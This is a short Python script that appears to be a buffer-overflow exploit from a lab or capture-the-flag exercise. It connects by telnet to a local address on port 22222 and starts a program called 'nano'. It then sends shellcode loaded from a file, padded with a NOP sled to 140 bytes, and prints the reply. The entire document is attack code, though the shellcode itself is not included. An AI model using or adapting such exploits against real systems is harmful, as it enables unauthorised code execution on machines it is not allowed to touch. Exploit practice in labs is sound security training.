import telnetlib
import time

ip_adress = '192.168.56.1'
port_num = 22222


def exploit(tn):

    s = tn.get_socket()
    with open('shellcode_nano' , 'rb') as f:
        sc = f.read()
        sc = sc.rjust(140, b'\x90')

        s.send(b'./nano\n')
        time.sleep(0.5)

        s.send(sc + B'\n')

        print(s.recv(2048))


def main():

    tn = telnetlib.Telnet(ip_adress, port_num)
    exploit(tn)


if __name__ == '__main__':

    main()

